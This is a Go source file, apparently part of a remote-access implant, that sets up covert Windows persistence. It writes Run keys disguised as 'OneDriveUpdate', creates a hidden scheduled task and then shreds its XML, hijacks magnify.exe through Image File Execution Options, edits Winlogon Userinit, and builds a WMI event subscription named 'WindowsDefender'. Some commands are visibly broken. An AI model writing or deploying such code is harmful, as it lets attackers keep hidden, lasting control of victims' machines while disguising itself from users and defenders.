package client

import (
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"syscall"
	"time"

	"github.com/lu4p/shred"
	"golang.org/x/sys/windows/registry"
)

// TODO: Persit on different locations on disk
// TODO: Add Fileless persistence as shown by
// https://github.com/ewhitehats/InvisiblePersistence

// Persist makes sure that the executable is run after a reboot
func Persist(path string) {
	elevated := CheckElevate()
	if elevated {
		persistAdmin(path)
	} else {
		persistUser(path)
	}
}

// persistAdmin persistence using admin privileges
func persistAdmin(path string) {
	go schtasks(path)
	go ifeo(path)
	go userinit(path)
	go wmic(path)
	go hklm(path)
}

// persistUser persistence using user privileges
func persistUser(path string) {
	version, _ := GetVer()
	if version == 10 {
		go people(path)
		go cortana(path)
	}
	hkcu(path)

}

// cortana noadmin works on win 10
func cortana(path string) error {
	// TODO: Add cortana persitence https://github.com/rootm0s/WinPwnage/blob/master/winpwnage/functions/persist/persist_cortana.py
	return errors.New("Not implemented")
}

// people noadmin works on Win10
func people(path string) error {
	// TODO: Add people persitence https://github.com/rootm0s/WinPwnage/blob/master/winpwnage/functions/persist/persist_people.py
	return errors.New("Not implemented")
}

// hkcu noadmin should just work
func hkcu(path string) error {

	key, err := registry.OpenKey(
		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
	)
	if err != nil {
		return err
	}
	defer key.Close()
	err = key.SetStringValue("OneDriveUpdate", path)
	if err != nil {
		return err
	}
	log.Println("hkcu success")
	return nil
}

// hklm admin
func hklm(path string) error {
	keypath := `Software\Microsoft\Windows\CurrentVersion\Run`
	if runtime.GOARCH == "386" {
		keypath = `Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run`

	}
	key, _, err := registry.CreateKey(
		registry.LOCAL_MACHINE, keypath,
		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
	)
	if err != nil {
		return err
	}
	defer key.Close()
	err = key.SetStringValue("OneDriveUpdate", path)
	if err != nil {
		return err
	}
	log.Println("hklm success")
	return nil
}

//schtask admin
func schtasks(path string) error {

	var xmlTemplate = schtask
	var tempxml = filepath.Join(Path, "temp.xml")
	err := ioutil.WriteFile(tempxml, []byte(xmlTemplate), 0666)
	if err != nil {
		return err
	}

	cmd := exec.Command("cmd", "/C", "schtasks /create /xml %s /tn OneDriveUpdate", filepath.Join(Path, "temp.xml"))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return err
	}

	time.Sleep(5 * time.Second)
	shred.Conf{1, true, true}.File(tempxml)
	log.Println("schtask success")
	return nil
}

// ifeo admin
func ifeo(path string) error {

	access, _, err := registry.CreateKey(
		registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Accessibility`,
		registry.SET_VALUE|registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer access.Close()
	keypath := `Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`
	if runtime.GOARCH == "386" {
		keypath = `Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`
	}
	magnify, _, err := registry.CreateKey(
		registry.CURRENT_USER, keypath,
		registry.SET_VALUE|registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer magnify.Close()
	if err := magnify.SetStringValue("Configuration", "magnifierpane"); err != nil {
		return err
	}

	if err := access.SetStringValue("Debugger", path); err != nil {
		return err
	}
	log.Println("ifeo success")
	return nil
}

// userinit admin
func userinit(path string) error {

	key, _, err := registry.CreateKey(
		registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Winlogon`,
		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
	)
	if err != nil {
		return err
	}
	defer key.Close()
	err = key.SetStringValue("Userinit", fmt.Sprintf("%s\\System32\\userinit.exe, %s", os.Getenv("SYSTEMROOT"), path))
	if err != nil {
		return err
	}
	log.Println("userinit success")
	return nil
}

// wmic admin
func wmic(path string) error {
	cmd := exec.Command("cmd", "/C",
		fmt.Sprintf(
			"wmic /namespace:'\\\\root\\subscription' PATH __EventFilter CREATE Name='GuacBypassFilter', EventNameSpace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System''",
		),
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err := cmd.Output()
	if err != nil {
		return err
	}

	time.Sleep(5 * time.Second)

	cmd = exec.Command("cmd", "/C",
		fmt.Sprintf(
			"wmic /namespace:'\\\\root\\subscription' PATH CommandLineEventConsumer CREATE Name='WindowsDefender', ExecutablePath='%s',CommandLineTemplate='%s'",
			path,
			path,
		),
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return err
	}
	time.Sleep(5 * time.Second)

	cmd = exec.Command("cmd", "/C", "wmic /namespace:'\\\\root\\subscription' PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name='GuacBypassFilter'', Consumer='CommandLineEventConsumer.Name='GuacBypassConsomer''")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return err
	}
	log.Println("wmci success")
	return nil
}
